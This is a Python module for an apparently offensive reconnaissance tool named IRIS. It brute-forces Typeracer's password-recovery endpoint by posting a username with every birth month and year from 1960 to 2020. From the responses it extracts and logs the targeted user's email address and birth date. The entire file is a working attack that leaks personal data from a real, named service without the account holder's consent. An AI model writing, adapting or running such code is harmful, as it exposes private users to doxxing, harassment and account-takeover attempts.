import aiohttp
import asyncio
import re

from iris.logger import Logger
from iris.module import Module


class IRISModule(Module):
    description = 'Get email-address of Typeracer user by username'
    author = 'cs'
    date = '29-07-2021'

    def execute(self, username: str):
        Logger.info('Brute forcing birth date. This might take a while...')

        asyncio.get_event_loop().run_until_complete(self.__start(username))
    
    async def __start(self, username: str):
        async with aiohttp.ClientSession() as session:
            for birth_year in range(1960, 2021):
                for birth_month in range(1, 12 + 1):
                    email, birth_date = await self.__send_request(session, username, birth_month, birth_year)

                    if email is not None:
                        Logger.success(f'Birth date: {birth_date}')
                        Logger.success(f'{username} => {email}')

    async def __send_request(self, session, username: str, birth_month: int, birth_year: int):
        try:
            async with session.post('https://data.typeracer.com/pit/forgot_login', data={'search': username, 'birthMonth': birth_month, 'birthYear': birth_year}) as res:
                res_body = await res.text()

                match = re.search(r'[\w\.-]+@[\w\.-]+', res_body)

                email = match.group(0)

                if email != 'support@typeracer.com':
                    return email, f'{birth_month}/{birth_year}'

        except Exception:
            pass

        return None, None